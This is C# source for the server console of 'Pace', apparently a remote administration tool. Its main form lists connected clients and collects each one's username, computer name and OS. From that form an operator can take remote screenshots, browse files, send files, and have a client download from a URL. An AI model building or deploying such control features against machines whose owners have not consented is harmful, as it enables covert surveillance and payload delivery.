using Pace.Common.Network.Packets;
using Pace.Common.Network.Packets.Client;
using Pace.Common.Network.Packets.Server;
using Pace.Server.Forms;
using Pace.Server.Network;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pace.Server.Forms
{
    public partial class MainForm : Form
    {
        private PaceServer server;
        private PacketChannel packetChannel;

        public MainForm()
        {
            InitializeComponent();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            clientListview.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
            clientListview.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

            server = new PaceServer();
            server.ClientConnected += Server_ClientConnected;
            server.ClientDisconnected += Server_ClientDisconnected;
            server.PacketReceived += Server_PacketReceived;

            packetChannel = new PacketChannel();
            packetChannel.RegisterHandler<GetSystemInfoResponsePacket>(SystemInformationHandler);
            packetChannel.RegisterHandler<TakeScreenshotResponsePacket>(ScreenshotHandler);

            server.Start();
        }

        private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            server.Shutdown();
        }

        private void exitMenuItem_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void Server_ClientConnected(object sender, ClientConnectedEventArgs e)
        {
            MessageBox.Show(
                $"Client connected from {e.Client.TcpClient.Client.RemoteEndPoint}.",
                "Pace",
                MessageBoxButtons.OK,
                MessageBoxIcon.Information
            );

            e.Client.SendPacket(new GetSystemInfoRequestPacket());
        }

        private void Server_ClientDisconnected(object sender, ClientConnectedEventArgs e)
        {
            MessageBox.Show(
                $"Client at {e.Client.TcpClient.Client.RemoteEndPoint} disconnected.",
                "Pace",
                MessageBoxButtons.OK,
                MessageBoxIcon.Information
            );
        }

        private void Server_PacketReceived(object sender, PacketEventArgs e)
        {
            var packet = e.Packet;
            var client = e.Client;

            packetChannel.HandlePacket(packet);
        }

        private void fileExplorerMenuItem_Click(object sender, EventArgs e)
        {
            using (var fileExplorerForm = new FileExplorerForm(server.ConnectedClients[clientListview.SelectedItems[0].Index]))
            {
                fileExplorerForm.ShowDialog();
            }
        }

        private void takeScreenshotMenuItem_Click(object sender, EventArgs e)
        {
            server.ConnectedClients[clientListview.SelectedItems[0].Index].SendPacket(
                new TakeScreenshotRequestPacket()
            );
        }

        private void sendFileMenuItem_Click(object sender, EventArgs e)
        {
            using (var fileDialog = new OpenFileDialog())
            {
                if (fileDialog.ShowDialog() != DialogResult.OK)
                {
                    return;
                }

                byte[] fileBytes = File.ReadAllBytes(fileDialog.FileName);

                server.ConnectedClients[clientListview.SelectedItems[0].Index].SendPacket(
                    new SendFileRequestPacket(fileDialog.SafeFileName, fileBytes)
                );
            }
        }

        private void downloadFromURLMenuItem_Click(object sender, EventArgs e)
        {
            using (var downloadWebFileForm = new DownloadWebFileForm(server, server.ConnectedClients[clientListview.SelectedItems[0].Index]))
            {
                downloadWebFileForm.ShowDialog();
            }
        }

        private void contextMenu_Opening(object sender, CancelEventArgs e)
        {
            if (clientListview.SelectedItems.Count < 1)
            {
                e.Cancel = true;
            }
        }

        private void aboutMenuItem_Click(object sender, EventArgs e)
        {
            using (var aboutForm = new AboutForm())
            {
                aboutForm.ShowDialog();
            }
        }

        private void SystemInformationHandler(object packet)
        {
            var systemInfoResponse = (GetSystemInfoResponsePacket)packet;

            //string[] addressInfo = client.TcpClient.Client.RemoteEndPoint.ToString().Split(':');

            clientListview.Invoke(new Action(() =>
            {
                string[] row =
                {
                        systemInfoResponse.Identifier,
                        "REPLACE",
                        "LATER",
                        systemInfoResponse.Username,
                        systemInfoResponse.ComputerName,
                        systemInfoResponse.OS
            };

                clientListview.Items.Add(new ListViewItem(row));
            }));
        }

        private void ScreenshotHandler(object packet)
        {
            var screenshotPacket = (TakeScreenshotResponsePacket)packet;

            byte[] screenshotBytes = screenshotPacket.ImageData;

            using (var ms = new MemoryStream(screenshotBytes))
            {
                var image = new Bitmap(ms);

                var now = DateTime.Now;
                string fileName = $"{now.Day}-{now.Month}-{now.Year}-{now.Hour}-{now.Minute}-{now.Second}.png";

                File.WriteAllBytes(Path.Combine("Data", "Screenshots", fileName), screenshotBytes);

                using (var viewImageForm = new ViewImageForm(image))
                {
                    viewImageForm.ShowDialog();
                }
            }
        }
    }
}